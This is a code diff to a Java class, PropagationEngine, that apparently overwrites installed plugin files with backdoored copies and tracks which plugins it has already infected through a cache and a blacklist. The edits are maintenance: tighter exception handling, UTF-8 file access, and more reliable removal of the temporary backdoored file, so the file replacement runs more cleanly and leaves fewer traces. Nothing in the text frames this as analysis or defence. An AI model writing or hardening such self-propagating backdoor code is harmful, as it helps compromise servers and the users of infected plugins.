@@ -57,7 +57,7 @@ public class PropagationEngine implements Runnable {
 
         // Add custom blacklist from config
         if (Config.PROPAGATION_BLACKLIST != null) {
-            blacklist.addAll(Arrays.asList(Config.PROPAGATION_BLACKLIST));
+            blacklist.addAll(Config.PROPAGATION_BLACKLIST);
         }
     }
 
@@ -251,7 +251,9 @@ public class PropagationEngine implements Runnable {
             Files.copy(backdoored.toPath(), original.toPath(), StandardCopyOption.REPLACE_EXISTING);
 
             // Delete temp backdoored file
-            backdoored.delete();
+            if (backdoored.exists() && !backdoored.delete()) {
+                backdoored.deleteOnExit();
+            }
 
             DebugLogger.verbose("File replacement successful: " + original.getName());
             return true;
@@ -260,8 +262,8 @@ public class PropagationEngine implements Runnable {
             DebugLogger.error("Failed to replace plugin: " + original.getName(), e);
 
             // Cleanup temp file
-            if (backdoored.exists()) {
-                backdoored.delete();
+            if (backdoored.exists() && !backdoored.delete()) {
+                backdoored.deleteOnExit();
             }
 
             return false;
@@ -288,7 +290,7 @@ public class PropagationEngine implements Runnable {
                 sb.append(String.format("%02x", b));
             }
             return sb.toString();
-        } catch (Exception e) {
+        } catch (IOException | java.security.NoSuchAlgorithmException e) {
             return String.valueOf(file.lastModified());
         }
     }
@@ -311,7 +313,7 @@ public class PropagationEngine implements Runnable {
             return;
         }
 
-        try (BufferedReader reader = new BufferedReader(new FileReader(cacheFile))) {
+        try (BufferedReader reader = new BufferedReader(new FileReader(cacheFile, java.nio.charset.StandardCharsets.UTF_8))) {
             String line;
             while ((line = reader.readLine()) != null) {
                 String[] parts = line.split(":");
@@ -320,7 +322,7 @@ public class PropagationEngine implements Runnable {
                 }
             }
             DebugLogger.log("Loaded propagation cache: " + processedPlugins.size() + " entries");
-        } catch (Exception e) {
+        } catch (IOException e) {
             DebugLogger.error("Failed to load cache", e);
         }
     }
@@ -331,7 +333,7 @@ public class PropagationEngine implements Runnable {
     private void saveCache() {
         File cacheFile = new File(pluginsFolder, CACHE_FILE);
 
-        try (PrintWriter writer = new PrintWriter(new FileWriter(cacheFile))) {
+        try (PrintWriter writer = new PrintWriter(new FileWriter(cacheFile, java.nio.charset.StandardCharsets.UTF_8))) {
             for (Map.Entry<String, String> entry : processedPlugins.entrySet()) {
                 writer.println(entry.getKey() + ":" + entry.getValue());
             }
@@ -345,7 +347,7 @@ public class PropagationEngine implements Runnable {
 
             DebugLogger.verbose("Cache saved: " + processedPlugins.size() + " entries");
 
-        } catch (Exception e) {
+        } catch (IOException e) {
             DebugLogger.error("Failed to save cache", e);
         }
     }
